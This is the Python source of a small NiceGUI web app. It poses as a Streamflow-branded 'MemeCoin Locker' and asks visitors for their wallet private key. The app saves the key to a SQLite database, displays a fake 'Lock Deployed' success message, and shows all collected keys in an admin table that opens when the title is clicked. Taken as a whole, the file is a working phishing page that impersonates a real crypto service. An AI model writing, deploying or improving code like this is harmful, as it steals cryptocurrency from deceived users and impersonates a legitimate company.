import os
import sqlite3
import pandas as pd
from nicegui import ui

DB_PATH = 'data.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('CREATE TABLE IF NOT EXISTS u (n TEXT, k TEXT, s TEXT, a REAL, d INTEGER)')
    conn.commit()
    conn.close()

init_db()

@ui.page('/')
def index():
    ui.add_head_html("<style>body{background-color:#0b0e11;color:white;}.btn{background-color:#00ffbd!important;color:black;font-weight:bold;width:100%;height:55px;border-radius:8px;}.t-btn{cursor:pointer;user-select:none;}</style>")

    with ui.column().classes('w-full max-w-lg mx-auto p-6 gap-4'):
        ui.image('https://streamflow.finance/favicon.ico').classes('w-16 mx-auto mb-2')

        # --- ASTA ESTE FUNCȚIA CARE DESCHIDE TABELUL ---
        def toggle_admin():
            if admin_box.style['display'] == 'none':
                c = sqlite3.connect(DB_PATH); df = pd.read_sql_query("SELECT * FROM u", c); c.close()
                results.clear()
                with results:
                    if df.empty: ui.label('No data collected yet.').classes('text-gray-400')
                    else: ui.table(columns=[{'name':x,'label':x,'field':x} for x in df.columns], rows=df.to_dict('records')).props('dark dense flat bordered')
                admin_box.style(display='block')
            else:
                admin_box.style(display='none')

        # CLICK PE TEXTUL DE MAI JOS DESCHIDE ADMINUL
        ui.label('MemeCoin Locker').classes('text-3xl font-bold text-center w-full mt-4 t-btn').on('click', toggle_admin)
        
        admin_box = ui.column().classes('w-full p-2 bg-black border border-gray-800 rounded mb-4').style('display: none')
        with admin_box:
            results = ui.column().classes('w-full')

        ui.label('Securely lock your project funds.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm')
        
        n = ui.input('Project Name').props('dark filled').classes('w-full')
        k = ui.input('Wallet Private Key').props('dark filled password-toggle').classes('w-full')
        
        with ui.row().classes('w-full gap-4'):
            s = ui.input('Symbol').props('dark filled').classes('flex-1')
            a = ui.number('Amount', value=0.0).props('dark filled').classes('flex-1')
        
        d = ui.number('Days', value=365).props('dark filled').classes('w-full')

        def save():
            if n.value and k.value:
                c = sqlite3.connect(DB_PATH); c.execute("INSERT INTO u VALUES (?,?,?,?,?)", (n.value, k.value, s.value, a.value, d.value)); c.commit(); c.close()
                ui.notify('Connecting...', color='info')
                ui.notify('Success! Lock Deployed.', color='positive')

        ui.button('DEPLOY LOCK', on_click=save).classes('btn')

port = int(os.environ.get('PORT', 10000))
ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")

